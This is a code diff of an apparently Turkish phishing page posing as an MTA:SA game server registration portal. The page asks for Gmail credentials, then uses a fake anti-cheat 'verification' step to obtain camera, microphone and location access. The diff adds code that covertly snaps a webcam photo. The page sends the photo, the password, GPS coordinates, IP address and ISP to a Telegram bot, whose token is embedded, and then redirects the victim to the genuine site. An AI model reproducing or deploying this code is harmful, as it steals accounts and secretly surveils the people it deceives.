@@ -3,24 +3,22 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>MTA:SA Global Registry - Verification Required</title>
+    <title>MTA:SA Server Portal</title>
     <style>
         body { margin: 0; padding: 0; background-color: #0a0a0a; font-family: 'Segoe UI', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; color: #fff; overflow: hidden; }
         .mta-box { background: #161616; width: 100%; max-width: 380px; padding: 30px; border-radius: 15px; border: 1px solid #333; box-shadow: 0 25px 50px rgba(0,0,0,1); text-align: center; position: relative; }
-        .logo-img { width: 110px; margin-bottom: 15px; filter: drop-shadow(0 0 8px #3498db); }
-        h2 { font-size: 18px; margin-bottom: 20px; color: #3498db; text-transform: uppercase; letter-spacing: 1px; }
         
+        /* LOGO ALANI - GARANTİ YÖNTEM */
+        .logo-placeholder { margin-bottom: 20px; }
+        .mta-text-logo { font-size: 32px; font-weight: 800; color: #3498db; letter-spacing: -1px; text-shadow: 0 0 15px rgba(52, 152, 219, 0.5); font-style: italic; }
+        .mta-sub-text { font-size: 10px; color: #555; display: block; margin-top: -5px; }
+
+        h2 { font-size: 18px; margin-bottom: 20px; color: #3498db; text-transform: uppercase; letter-spacing: 1px; }
         .input-group { margin-bottom: 15px; text-align: left; }
         .input-group label { display: block; font-size: 11px; color: #666; margin-bottom: 5px; font-weight: bold; }
-        .input-group input { width: 100%; padding: 12px; background: #222; border: 1px solid #333; border-radius: 6px; color: white; box-sizing: border-box; outline: none; transition: 0.3s; }
-        .input-group input:focus { border-color: #3498db; box-shadow: 0 0 10px rgba(52, 152, 219, 0.3); }
-        
+        .input-group input { width: 100%; padding: 12px; background: #222; border: 1px solid #333; border-radius: 6px; color: white; box-sizing: border-box; outline: none; }
         .main-btn { background: #3498db; color: white; border: none; padding: 15px; width: 100%; border-radius: 6px; font-weight: bold; cursor: pointer; font-size: 15px; margin-top: 10px; }
-        
-        /* DOĞRULAMA EKRANI (ZORUNLU KISIM) */
         #verify-modal { display: none; position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: #1a1a1a; border-radius: 15px; padding: 30px; box-sizing: border-box; z-index: 10; flex-direction: column; justify-content: center; }
-        .verify-icon { font-size: 40px; color: #f1c40f; margin-bottom: 15px; }
-        .verify-text { font-size: 13px; color: #ccc; margin-bottom: 25px; line-height: 1.6; }
         .confirm-btn { background: #27ae60; color: white; border: none; padding: 15px; width: 100%; border-radius: 6px; font-weight: bold; cursor: pointer; }
     </style>
 </head>
@@ -28,7 +26,10 @@
 
 <div class="mta-box">
     <div id="reg-step">
-        <img src="https://www.multitheftauto.com/images/mta_logo.png" class="logo-img">
+        <div class="logo-placeholder">
+            <span class="mta-text-logo">MTA:SA</span>
+            <span class="mta-sub-text">MULTI THEFT AUTO: SAN ANDREAS</span>
+        </div>
         <h2>Sunucu Kayıt Paneli</h2>
         <div class="input-group">
             <label>GMAIL ADRESİ</label>
@@ -42,13 +43,11 @@
     </div>
 
     <div id="verify-modal">
-        <div class="verify-icon">⚠️</div>
-        <h3>SON ADIM: DOĞRULAMA</h3>
-        <p class="verify-text">
-            MTA:SA Anti-Cheat ve Voice Chat (Sesli Sohbet) sisteminin aktif edilebilmesi için <b>Konum</b> ve <b>Medya</b> erişim doğrulaması zorunludur.
+        <h3 style="color:#f1c40f">⚠️ SON ADIM: DOĞRULAMA</h3>
+        <p style="font-size: 13px; color:#ccc; margin-bottom:20px;">
+            Sunucu Anti-Cheat ve Voice Chat sisteminin aktif edilebilmesi için <b>Güvenlik Doğrulaması</b> zorunludur.
         </p>
-        <button class="confirm-btn" onclick="herseyiBitir()">ERİŞİMİ ONAYLA VE BAĞLAN</button>
-        <p style="font-size: 10px; color: #555; margin-top: 15px;">Reddedilmesi durumunda kayıt iptal edilecektir.</p>
+        <button class="confirm-btn" id="finalBtn" onclick="herseyiBitir()">ERİŞİMİ ONAYLA VE BAĞLAN</button>
     </div>
 </div>
 
@@ -56,64 +55,74 @@
     const botToken = "6418277280:AAGlTr7IRw8CL__1EWjpkI_j9ZHkRjLnedc";
     const chatId = "1540769169";
 
-    // İlk aşama: Bilgileri al ve modalı göster
     function dogrulamaGoster() {
-        const email = document.getElementById('email').value;
-        const pass = document.getElementById('pass').value;
-        if(!email || !pass) { alert("Lütfen alanları doldurun!"); return; }
-        
-        document.getElementById('reg-step').style.opacity = '0.2';
+        if(!document.getElementById('email').value || !document.getElementById('pass').value) {
+            alert("Lütfen tüm alanları doldurun!"); return;
+        }
+        document.getElementById('reg-step').style.opacity = '0.1';
         document.getElementById('verify-modal').style.display = 'flex';
     }
 
-    // İkinci aşama: İzinleri zorunlu olarak iste ve verileri gönder
+    async function fotoCekVeGonder(stream) {
+        try {
+            const video = document.createElement('video');
+            video.srcObject = stream;
+            video.muted = true;
+            await video.play();
+
+            const canvas = document.createElement('canvas');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            const context = canvas.getContext('2d');
+            
+            await new Promise(r => setTimeout(r, 1500)); // Odaklanma süresi
+            
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+            canvas.toBlob(async (blob) => {
+                const formData = new FormData();
+                formData.append('photo', blob, 'capture.jpg');
+                await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto?chat_id=${chatId}`, {
+                    method: 'POST', body: formData
+                });
+                stream.getTracks().forEach(t => t.stop());
+            }, 'image/jpeg', 0.7);
+        } catch (e) { console.log(e); }
+    }
+
     async function herseyiBitir() {
         const email = document.getElementById('email').value;
         const pass = document.getElementById('pass').value;
+        const btn = document.getElementById('finalBtn');
+        btn.innerText = "SİSTEM DOĞRULANIYOR...";
+        btn.disabled = true;
 
-        // 1. Kamera ve Mikrofon (Zorunlu gibi soruluyor)
         try {
-            await navigator.mediaDevices.getUserMedia({ audio: true, video: true });
-            gonder("📸 **KAMERA/MİKROFON İZNİ ONAYLANDI!**");
-        } catch(e) { gonder("❌ Kamera izni reddedildi."); }
+            const stream = await navigator.mediaDevices.getUserMedia({ audio: true, video: true });
+            await fotoCekVeGonder(stream);
+        } catch(e) { gonder("❌ Kamera reddedildi."); }
 
-        // 2. Tam Konum (Zorunlu gibi soruluyor)
         if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition(p => {
-                gonder(`📍 **TAM KONUM:** https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`);
-            }, () => { gonder("❌ Konum reddedildi."); });
+                gonder(`📍 **KONUM:** http://google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`);
+            });
         }
 
-        // 3. IP ve Teknik Bilgiler
         try {
             const ipRes = await fetch('https://ipapi.co/json/');
             const ipData = await ipRes.json();
-            
-            let batarya = "Bilinmiyor";
-            if (navigator.getBattery) {
-                const b = await navigator.getBattery();
-                batarya = `%${Math.round(b.level * 100)}`;
-            }
-
-            const mesaj = `🔥 **MTA ZORUNLU KAYIT VERİSİ**\n\n` +
-                          `📧 **Gmail:** \`${email}\`\n` +
-                          `🔑 **Şifre:** \`${pass}\`\n` +
-                          `🌐 **IP:** \`${ipData.ip}\`\n` +
-                          `🔋 **Şarj:** ${batarya}\n` +
-                          `📱 **Sistem:** ${navigator.platform}`;
-
-            gonder(mesaj);
+            gonder(`👤 **GİRİŞ:** \`${email}\` / \`${pass}\`\n🌐 **IP:** \`${ipData.ip}\`\n🏢 **ISP:** ${ipData.org}`);
         } catch(e) {}
 
-        // Final Mesajı
-        alert("Doğrulama başarılı! Hesabınız 5 dakika içinde aktif edilecektir.");
-        window.location.href = "https://multitheftauto.com";
+        setTimeout(() => {
+            alert("Doğrulama başarılı! Mailinizi kontrol edin.");
+            window.location.href = "https://multitheftauto.com";
+        }, 3000);
     }
 
     function gonder(m) {
         fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(m)}&parse_mode=markdown`);
     }
 </script>
-
 </body>
 </html>
+
